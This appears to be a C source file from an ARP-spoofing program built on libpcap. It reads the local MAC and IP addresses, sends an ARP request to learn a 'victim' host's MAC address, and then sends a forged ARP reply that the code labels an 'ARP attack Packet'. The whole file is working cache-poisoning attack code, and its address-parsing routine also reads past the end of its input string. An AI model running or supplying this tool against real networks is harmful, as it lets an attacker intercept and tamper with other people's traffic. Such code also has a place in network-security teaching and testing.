#include <linux/types.h>
#include <linux/socket.h>
#include <linux/ioctl.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include "send_arp.h"

void str_to_ip(uint8_t * iparr, 
               char * ipstr) {
    for(int i=0; i<4; i++){
        iparr[i] = atoi(ipstr);
        while(strncmp((const char *)ipstr, ".", 1) != 0)
            ipstr++;
        ipstr++;
    }
}

int get_mac(uint8_t * my_mac, 
            const char * interface) {
	int sock_fd;
	struct ifreq ifr;
    char buf[20];
    char * ptr = buf;
    memset(buf, 0, sizeof(buf));

	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_fd < 0) {
		perror("socket error : ");
		return -1;
	}

    strcpy(ifr.ifr_name, interface);

	if (ioctl(sock_fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl error : ");
		close(sock_fd);
		return -1;
	}
	
    sprintf((char *)buf, "%02x:%02x:%02x:%02x:%02x:%02x", 
        (__uint8_t)ifr.ifr_hwaddr.sa_data[0],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[1],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[2],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[3],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[4],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[5]);

    for(int i=0; i<6; i++) {
        char * end = ptr+2;
        my_mac[i] = (__uint8_t)strtol(ptr, &end, 16);
        ptr += 3;
    }

    close(sock_fd);
    return 0;
}

int get_ip(uint8_t * my_ip, 
           const char * interface) {
    int sock_fd;
	struct ifreq ifr;
	struct sockaddr_in * sin;
    __uint32_t ip;

	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_fd < 0) {
		perror("socket error : ");
		return -1;
	}

	strcpy(ifr.ifr_name, interface);

	if (ioctl(sock_fd, SIOCGIFADDR, &ifr)< 0) {
		perror("ioctl error : ");
		close(sock_fd);
		return -1;
	}

	sin = (struct sockaddr_in*)&ifr.ifr_addr;
    ip = ntohl(sin->sin_addr.s_addr);

    my_ip[0] = (ip & 0xFF000000)>>24;
    my_ip[1] = (ip & 0x00FF0000)>>16;
    my_ip[2] = (ip & 0x0000FF00)>>8;
    my_ip[3] = (ip & 0x000000FF);

	close(sock_fd);
	return 0;
}

void dump(const u_char * pkt, 
          int size) {
    for(int i=0; i<size; i++) {
        if (i % 16 == 0) printf("\n");
        printf("%02X ", pkt[i]);
    }
}

void ARP_init(ARP_pkt * arp_pkt,
              uint8_t * eth_dst,
              uint8_t * eth_src,
              const uint16_t eth_type,
              const uint16_t arp_op,
              uint8_t * s_hw_addr,
              uint8_t * s_p_addr,
              uint8_t * t_hw_addr,
              uint8_t * t_p_addr) {
    // Ethernet
    memcpy(arp_pkt->eh.dst, eth_dst, sizeof(arp_pkt->eh.dst));
    memcpy(arp_pkt->eh.src, eth_src, sizeof(arp_pkt->eh.src));
    arp_pkt->eh.type = htons(eth_type);

    // ARP
    arp_pkt->ah.hw_type = htons(ARP_HWTYPE_MAC);
    arp_pkt->ah.p_type = htons(ARP_PTYPE_IPv4);
    arp_pkt->ah.hw_len = ARP_HW_LEN;
    arp_pkt->ah.p_len = ARP_P_LEN;
    arp_pkt->ah.op = htons(arp_op);
    memcpy(arp_pkt->ah.s_hw_addr, s_hw_addr, sizeof(arp_pkt->ah.s_hw_addr));
    memcpy(arp_pkt->ah.s_p_addr, s_p_addr, sizeof(arp_pkt->ah.s_p_addr));
    memcpy(arp_pkt->ah.t_hw_addr, t_hw_addr, sizeof(arp_pkt->ah.t_hw_addr));
    memcpy(arp_pkt->ah.t_p_addr, t_p_addr, sizeof(arp_pkt->ah.t_p_addr));
}

void send_ARP_req(uint8_t * my_mac, 
                  uint8_t * my_ip, 
                  uint8_t * target_ip, 
                  pcap_t * handle) {
    ARP_pkt * arp_req_broadcast = (ARP_pkt *)malloc(ARP_size);
    int result = 0;
    memset(arp_req_broadcast, 0, ARP_size);
    ARP_init(arp_req_broadcast,
             (uint8_t *)BROADCAST,
             my_mac, 
             ETHERTYPE_ARP,
             ARP_OP_REQ,
             my_mac,
             my_ip,
             (uint8_t *)UNKNOWN,
             target_ip);

    printf("[ ARP Request Packet ]");
    dump((const u_char *)arp_req_broadcast, ARP_size);
    printf("\n");

    result = pcap_sendpacket(handle, (const u_char *)arp_req_broadcast, ARP_size);

    if (result == -1) {
        pcap_perror(handle, pcap_geterr(handle));
        exit(0);
    }
    free(arp_req_broadcast);

}
 
void recv_ARP_rep(uint8_t * target_ip, uint8_t * mac_buf, pcap_t * handle) {
    ARP_pkt * arp_rep_from_victim = (ARP_pkt *)malloc(ARP_size);
    memset(arp_rep_from_victim, 0, ARP_size);

    while(1) {
        struct pcap_pkthdr * header;
        const u_char * packet;
        int result = pcap_next_ex(handle, &header, &packet);

        if (result == 0) { 
            perror("pcap_next_ex : "); 
            continue;
        }
        if (result == -1 || result == -2) { 
            perror("pcap_next_ex : "); 
            printf("please restart program\n");
            free(arp_rep_from_victim);
            exit(0);
        }

        memcpy(arp_rep_from_victim, packet, ARP_size);

        if ( ntohs(arp_rep_from_victim->eh.type) != ETHERTYPE_ARP ) {
            continue;
        }
        if ( memcmp((const u_char *)arp_rep_from_victim->ah.s_p_addr, 
                    (const u_char *)target_ip, 4) != 0) {
            continue;
        }
        printf("\n");
        printf("[ Victim's ARP Reply Packet ]");
        dump((const u_char *)arp_rep_from_victim, ARP_size);
        printf("\n");

        memcpy(mac_buf, arp_rep_from_victim->ah.s_hw_addr, 6);

        free(arp_rep_from_victim);
        break;
    }
}

void send_fake_ARP_rep(uint8_t * sender_mac,
                       uint8_t * sender_ip,
                       uint8_t * my_mac,
                       uint8_t * my_ip,
                       pcap_t * handle) {
    ARP_pkt * arp_rep_to_victim = (ARP_pkt *)malloc(ARP_size);
    memset(arp_rep_to_victim, 0, ARP_size);

    ARP_init(arp_rep_to_victim,
             sender_mac,
             my_mac,
             ETHERTYPE_ARP,
             ARP_OP_REP,
             my_mac,
             my_ip,
             sender_mac,
             sender_ip);

    printf("[ ARP attack Packet ]");
    dump((const u_char *)arp_rep_to_victim, ARP_size);
    printf("\n");

    if (-1 == pcap_sendpacket(handle, (const u_char *)arp_rep_to_victim, ARP_size)) {
        pcap_perror(handle, pcap_geterr(handle));
        exit(0);
    }
    
    free(arp_rep_to_victim);
}